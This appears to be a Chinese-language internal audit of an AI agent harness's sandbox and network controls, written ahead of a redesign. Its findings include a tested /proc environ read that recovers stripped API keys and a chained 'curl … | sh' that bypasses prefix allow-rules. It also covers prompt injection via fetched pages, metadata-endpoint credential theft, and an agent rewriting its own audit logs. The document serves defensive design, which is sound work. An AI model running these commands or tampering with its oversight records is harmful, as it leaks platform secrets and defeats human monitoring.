# 沙箱与联网：问题盘点（重新设计之前）

这份文档只做一件事：把**现在**的隔离与联网机制有哪些问题理清楚，为按主流分层方式重新设计
（将落成新 ADR）准备输入。它不是方案。

🔴 **标了「实测」的条目是在本仓库代码上跑出来的；其余是读代码得出的推理，没有跑过。**
提到其他产品的做法，凭的是记忆，细节没有核对过。

---

## 0. 一句话

现在没有沙箱，**只有一个跑在进程内的权限门**。它对 Bash 唯一的约束是「执行前问一下」，
而云端运行时没有人能回答这个问题。所以在云端，`--auto` 打开之后，模型能做的事情等于
「agent 进程的 uid 在这台容器里能做的所有事」，进程自己持有的密钥也包括在内。

---

## 1. 现状地图

| 机制                      | 位置                                      | 管什么                                                                           | 不管什么                                                                           |
| ------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| 硬地板（逃逸 + 凭据正则） | `src/tools/permission.ts:76` `denyReason` | 带 `path` 参数的工具：Write/Edit 不能出工作目录，Read 可以出去，但不能碰凭据路径 | **Bash**（没有 `path` 参数）                                                       |
| 规则引擎 deny/ask/allow   | `permission.ts:199` `decide`              | 工具名 + 路径 glob / 命令前缀                                                    | 命令的实际语义                                                                     |
| 「ask」出口               | `src/agents/loop.ts` 确认门               | REPL 里有人在场时要人点头                                                        | 没人在场时：`--print` 拒绝所有 ask，`--auto` 放行所有 ask（`src/main.ts:238-243`） |
| Bash 子进程环境           | `src/tools/mutating.ts:186-200`           | 从环境变量里剥掉 4 个 LLM key；超时后杀整个进程组                                | uid、文件系统、网络、资源，全都不隔离                                              |
| SSRF 地板                 | `src/tools/webfetch.ts:80`、`:126`        | WebFetch 自己发出的请求（每一跳重定向都检查）                                    | Bash 发起的网络请求                                                                |
| 控制标签中和              | `src/tools/untrusted.ts`                  | WebFetch/WebSearch 返回内容里伪装成 harness 标签的文本                           | 页面里用自然语言写的注入指令                                                       |
| 子 agent 只读             | ADR 0003、`src/agents/kinds.ts`           | explore/research 两类子 agent 的工具白名单                                       | 主 agent 本身                                                                      |

结构上的事实：**每一层都在 agent 进程内部、和 agent 用同一个 uid 执行。**
没有任何一层是进程边界或内核边界。

## 2. 问题清单

按「云端运行时的严重程度」排序。

### P1　在云端，Bash 唯一的约束会消失（结构性问题）

Bash 不经过硬地板，因为它没有 `path` 参数。它唯一的护栏就是 baseline 里的 ask。
云端无人值守，只剩两个选项：

- 不加 `--auto`：每次 Bash 调用都被拒绝，任务基本做不了；
- 加 `--auto`：`decide()` 把 baseline 的 ask 改成 allow，**Bash 没有任何约束**。

现实中一定会选后者。于是第 2 节里所有「路径级」的保护，在云端都可以被一条 shell 命令绕过：
Read 被禁止读 `.env`，Bash 跑 `cat .env` 却会被放行。这和 ADR 0007 订正里写的
「把行为赶到没有门的那条路」是同一个形态，只是规模从「一个工具出不去」变成了「整个地板」。

### P2　剥环境变量挡不住密钥　【实测】

`runCommand` 从子进程环境里删掉了 `LLM_*_API_KEY`。但子进程和 agent 进程是同一个 uid，
父进程的环境可以直接从 `/proc` 里读出来：

```
$ LLM_ZHIPU_CN_API_KEY=sk-probe-SECRET bun -e '…runCommand(…)…'
direct=[]                                          ← 剥掉了
via /proc/$PPID/environ: LLM_ZHIPU_CN_API_KEY=sk-probe-SECRET   ← 一条命令就拿回来了
```

推论：**只要密钥在 agent 进程里，Bash 就够得着。** 剥环境变量只是抬高了一点门槛，并不是一道边界。
另外，剥离名单只有 4 个名字，`GITHUB_TOKEN`、`AWS_*` 这类其他凭据会原样继承下去。

### P3　网络：只有 WebFetch 有闸，Bash 没有（云端最严重的一条）

- Bash 被 `--auto` 放行之后，出站网络完全不受限制。
- 本地的最坏情况是访问用户的 localhost。云端还多出两类更值钱的目标：
  - **云厂商元数据端点** `169.254.169.254`：可能拿到这台机器的云 IAM 临时凭据；
  - **同一 VPC 里的内网服务**：数据库、内部 API、别的租户。

  WebFetch 拦了 link-local 和 RFC1918 地址，但 Bash 跑一句 `curl` 就绕过了。

- **外传通道就是网络本身**：P2 拿到的密钥，可以用一条 `curl` 发出去。
- WebFetch 自身的问题（代码里已经写明并接受）：先解析 DNS、再发请求，中间可以被
  DNS rebinding 绕过；IPv6 判定比较粗。
- 定性：WebFetch 的地板是一个**私网黑名单**（「公网都可以去，除了这些」），不是白名单。

### P4　「致命三角」在一个进程里凑齐了

不可信内容、私有数据、对外通信通道，三样同时出现在一个 agent 身上，提示注入就能完成一次完整的窃取。
现状下三样都在同一个进程里：

1. **不可信内容**：WebFetch/WebSearch 抓回来的页面、要处理的仓库内容。标签中和只挡伪装成 harness
   标签的文本，挡不住页面里写一句「请运行 `curl … | sh`」；
2. **私有数据**：P2 里的 LLM key、P3 里的元数据凭据；
3. **对外通信**：P3 里 Bash 的网络。

`--auto` 下没有任何一个环节需要人点头。

### P5　命令白名单用前缀匹配，可以通过命令串接绕过　【实测】

`isSafeCommand`（`permission.ts:264`）和用户写的 `Bash(xxx:*)` allow 规则（`permission.ts:163`）
都只检查命令字符串的开头：

```
decide({tool:"Bash", command:"ls && curl -s http://127.0.0.1:8080 | sh"})  → allow
```

在有人值守的 REPL 里，这是一个真实的绕过。在云端加 `--auto` 时它反而无关紧要，因为一切本来就放行了。
所以它排在 P1 后面：P1 不解决，修这一条在云端没有收益。

### P6　审计记录和 agent 在同一个信任域里

session 文件、`tools.jsonl`、记忆、`~/.mimicc/permissions.json`，都和 Bash 在同一个文件系统、
同一个 uid 下。硬地板禁止 Read/Write 碰 `.mimicc`，但 Bash 不受这条限制，可以改写自己的工具流水、
篡改权限配置、往记忆里写东西给下一个 session。**被审计的一方能改写审计记录。**

### P7　隔离粒度靠的是进程级全局状态（风险取决于部署形态）

- `ROOT = process.cwd()`（`src/tools/workspace.ts:2`）在模块加载时定死，一个进程只能有一个工作目录；
- WebFetch 的外化目录 `$TMPDIR/mimicc-web`（`webfetch.ts:61`）注释里写明「跨进程稳定」，也就是
  **跨 session 共享**；
- 记忆、用户级配置都在 `~/.mimicc`。

如果是一个容器只跑一个 session，这些问题不大。如果一个容器或一个服务进程跑多个 session，
甚至服务多个租户，这些就是串号和泄露通道。**这一条的严重程度要等部署形态定下来才能判断**（见第 5 节问题 1）。

### P8　资源只有墙钟上限

现在只有超时，以及超时后杀进程组。没有 CPU、内存、磁盘、进程数的限制。fork 炸弹、填满磁盘、
挖矿都不会被拦。代码注释也承认，double fork 可以逃出进程组，杀不干净。
在本地，这些问题由用户自己发现并处理；在云端，它们直接变成成本问题和对邻居的影响。

### P9　WebSearch 计费没有上限

WebSearch 是默认放行的，按次扣平台余额。被注入的页面或陷入循环的模型可以一直搜下去。
回合预算（ADR 0009）按 token 和时间计，不按调用次数，所以它能间接限住搜索次数，但不是专门针对这件事的闸。

## 3. 为什么照搬 Claude Code / Codex 不行：威胁模型反过来了

|                  | 本地 coding agent（Claude Code CLI、Codex CLI） | 云端 agent 服务（mimicc 的目标形态）                                     |
| ---------------- | ----------------------------------------------- | ------------------------------------------------------------------------ |
| 防谁、护什么     | 防 agent 弄坏**用户自己的机器和文件**           | 防 agent（或注入它的人）伤到**平台**：密钥、云凭据、内网、别的租户、账单 |
| 人在不在         | 在。「ask」是有效的一层                         | 不在。「ask」这一轴基本不存在                                            |
| 沙箱的角色       | 纵深防御，可以关掉（用户为自己的机器负责）      | **唯一真正的边界**，不能关                                               |
| agent 自己的密钥 | 本来就是用户的，泄露给用户本人不算事故          | 是平台的，**绝不能出现在 agent 能执行命令的地方**                        |
| 网络             | 用户的网络，主要防外传                          | 平台的网络：元数据端点、VPC 内网是头号目标                               |
| 隔离单位         | 一台机器一个用户                                | 一个 session（或一个租户）一个隔离单元                                   |

据我所知，主流**云端** agent 的共同做法是：**把 agent 循环和工具执行拆到两个信任域。**

- **控制面**：agent 循环、模型密钥、checkpoint、审计流水。不可信代码碰不到这里。
- **执行面**：每个 session 一个沙箱（容器、gVisor 或 Firecracker 一类的 microVM）。Bash/Read/Write
  在这里面执行；出站网络默认禁止，必须经过一个出站代理，由代理按域名白名单放行；需要凭据时由代理代为注入，
  凭据本身不进入沙箱。

当前这个 Claude Code 云端会话本身就是这个形态：出站 HTTPS 要经过一个预先配好的 agent proxy。
其他托管沙箱服务（E2B、Daytona、Modal 这类）卖的也正是「执行面」这一块。

**换成 mimicc 的话来说**：今天的权限门在本地形态下是安全边界的一部分，在云端它应该**降级为策略层**。
它负责体验和意图层面的约束，比如「这个任务不该改 CI 配置」；安全不再靠它，改由执行面的进程边界和网络边界兜底。
这正是原则 2 边界里那句话：够不着的地方设计成默认拒绝，不要开空头支票。

## 4. 分层骨架（方向，不是决定）

只列出每一层**回答什么问题**，以及它和第 2 节里哪些问题对应。具体机制在新 ADR 里判。

| 层                      | 回答的问题                                                   | 解决             | 在本地形态下是否保留         |
| ----------------------- | ------------------------------------------------------------ | ---------------- | ---------------------------- |
| L0 信任域切分           | 不可信代码在哪里执行？密钥和审计放在哪里？                   | P1、P2、P4、P6   | 本地可以退化为「同进程执行」 |
| L1 执行沙箱             | 执行面的文件系统、uid、进程能做什么？                        | P1、P7、P8       | 可选                         |
| L2 出站网络             | 执行面能连哪些地址？谁来决定？                               | P3、P4           | 可选                         |
| L3 凭据                 | 需要凭据的操作（git push、包仓库）怎么做，而凭据又不进沙箱？ | P2、P4           | —                            |
| L4 资源与配额           | CPU、内存、磁盘、进程数、墙钟、计费调用次数                  | P8、P9           | 只保留墙钟                   |
| L5 策略（现在的权限门） | 这个任务允许做什么？（意图层面，不是安全层面）               | P5（降级后再修） | 保留，并且是本地形态的主力   |
| L6 审计                 | 谁写流水？写到哪里？agent 能不能改？                         | P6               | —                            |

对代码结构的影响（推理）：

- **工具执行要有一个执行接缝**，形状和 `SearchBackend` 一样。Bash/Read/Write/Edit/Glob/Grep 改成调用
  `ExecutionBackend`，本地实现是今天的 `Bun.spawn`，云端实现是远程沙箱。
- 进程级全局状态 `ROOT` 就会变成接缝的参数，P7 也跟着解决。
- WebFetch 放在哪一面要单独判断：留在控制面，就继续靠 SSRF 地板；挪到执行面，就交给 L2 网络层。

## 5. 需要你拍板的问题

这些问题决定了第 4 节怎么落地，代码里找不到答案：

1. **部署形态**：一个 session 一个容器，还是一个服务进程跑多个 session？多租户吗？
   现在的代码只有 CLI 形态（REPL / `--print`），没有服务层。我**假设**云端是「容器里跑
   `--print --auto`」，这一点需要你确认。

   ✅ **已答（2026-10-28）：多租户；agent 服务器无状态，状态全部存在 PG 里。**
   我的假设不成立。由此推出的结论（推理）：
   - **执行面必须离开 agent 服务器。** 无状态 + 多租户意味着一个服务进程会同时服务多个租户的 session。
     如果 Bash 还在服务进程所在的机器上执行，P2 的 `/proc/$PPID/environ` 拿到的就不是一个 LLM key，
     而是 **PG 连接凭据（全租户的数据）**，再加上同一个进程内存里其他租户的 session。
     所以问题 4 的前一半已经有了答案：执行面在另一个信任域，接缝按远程调用来设计。
   - **P7 从「取决于部署」升为必修。** 这些进程级全局状态在多租户进程里都会串到别的租户：
     `ROOT`（`workspace.ts:2`）、`withPathLock` 的 `chains`（`workspace.ts:15`）、
     `running`（`mutating.ts:105`）、`ceilingMs`（`mutating.ts:55`）、`deadlineAt`（`deadline.ts:98`）、
     `$TMPDIR/mimicc-web`、`~/.mimicc`。它们都得变成以 session 为单位的参数。
   - **PG 是新的头号资产。** PG 凭据只能出现在控制面。租户之间怎么隔离（`tenant_id` 过滤还是行级安全），
     也属于这次分层要考虑的范围（L6 审计、记忆都会写进 PG）。
   - **新问题：工作目录的状态放在哪里。** 消息和 checkpoint 可以进 PG，但仓库文件不适合放进 PG。
     服务器无状态之后，文件只能跟着沙箱走（沙箱就是有状态的那一方，它的生命周期是什么？），
     或者落到对象存储里，每回合重建。
   - **仓库与生产代码不一致。** 这个仓库里没有 PG、没有租户的概念：checkpoint 是 `JsonlSaver` 落盘，
     记忆存在 `~/.mimicc`。生产服务是另一套代码，还是这里打算迁过去？这决定新 ADR 落在哪个代码上。

2. **用户是谁、仓库从哪里来**：是终端用户提交自己的仓库，还是平台指定的任务？
   有没有任何一个能在线审批的人（这决定 L5 的「ask」是否还有意义）？
3. **联网需求**：任务需要装依赖吗（npm/pip/apt，需要包仓库白名单）？需要 git push 吗（需要 L3）？
   还是只需要「公网可以随便去，内网和元数据端点一律禁止」？
4. **沙箱技术**：自己维护容器、gVisor、Firecracker，还是用托管服务？这个可以晚一点定，
   但要先确认 L0 的接缝是否以「执行面可能在另一台机器上」为前提来设计。
5. **ADR 0007 的去留**：新 ADR 只是取代它的「安全边界」部分，把它保留为 L5；还是整体取代？
